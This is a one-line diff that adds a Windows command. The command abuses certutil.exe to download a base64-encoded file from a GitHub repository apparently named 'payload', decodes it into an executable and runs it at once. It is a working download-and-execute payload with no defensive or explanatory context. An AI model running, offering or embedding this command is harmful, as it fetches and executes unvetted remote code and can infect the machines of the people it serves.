@@ -1,0 +1,1 @@
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/halitAKAYDIN/payload/main/file.bs4" test.bs4  & timeout /t 5 /nobreak >nul & certutil -decode test.bs4 file.exe & cmd.exe /c file.exe
